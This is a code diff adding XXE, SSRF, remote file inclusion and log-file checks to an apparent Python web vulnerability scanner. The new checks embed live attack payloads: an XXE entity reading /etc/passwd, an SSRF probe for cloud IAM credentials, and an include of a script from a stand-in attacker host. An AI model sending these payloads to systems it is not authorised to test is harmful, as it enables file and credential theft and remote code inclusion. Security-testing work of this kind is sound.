@@ -101,8 +101,6 @@ def check_backup_files(url):
     return False
 
 
-
-
 def check_database_exposure(url):
     endpoints = ["phpmyadmin", "adminer", "dbadmin"]
     for endpoint in endpoints:
@@ -126,6 +124,40 @@ def check_sensitive_information(url):
         if keyword in response.text:
             return True
     return False
+    
+def check_log_files(url):
+    log_files = ["access.log", "error.log"]
+    parsed_url = urlparse(url)
+
+    for log_file in log_files:
+        log_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{log_file}"
+        response = requests.get(log_url)
+        if response.status_code == 200 and "log content" in response.text:
+            return True
+
+    return False
+    
+def check_xxe(url):
+    payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
+    response = requests.post(url, data=payload)
+    if response.status_code == 200 and "root:" in response.text:
+        return True
+    return False
+
+def check_ssrf(url):
+    payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
+    response = requests.get(url + "?url=" + payload)
+    if response.status_code == 200 and "AccessDenied" not in response.text:
+        return True
+    return False
+
+def check_rfi(url):
+    payload = "http://attacker.com/malicious_script.php"
+    response = requests.get(url + "?file=" + payload)
+    if response.status_code == 200 and "Malicious script executed" in response.text:
+        return True
+    return False
+
 
 
 session = requests.Session()
@@ -264,6 +296,15 @@ def scan_url(url):
         logging.warning(f"Directory Listings: {url}")
     if check_sensitive_information(url):
         logging.warning(f"Sensitive Information exposure: {url}")
+    if check_xxe(url):
+        logging.warning(f"XXE: {url}")
+    if check_ssrf(url):
+        logging.warning(f"SSRF: {url}")
+    if check_rfi(url):
+        logging.warning(f"RFI: {url}")
+    if check_log_files(url):
+        logging.warning(f"Log File Disclosure: {url}")
+
 
 def scan_response(response):
     if check_sqli(response.url):
@@ -284,6 +325,14 @@ def scan_response(response):
         logging.warning(f"Directory Listings: {response.url}")
     if check_sensitive_information(response.url):
         logging.warning(f"Sensitive Information: {response.url}")
+    if check_xxe(response.url):
+        logging.warning(f"XXE: {response.url}")
+    if check_ssrf(response.url):
+        logging.warning(f"SSRF: {response.url}")
+    if check_rfi(response.url):
+        logging.warning(f"RFI: {response.url}")
+    if check_log_files(response.url):
+        logging.warning(f"Log File Disclosure: {response.url}")
 
 
 def print_colorful(message, color=Fore.GREEN):
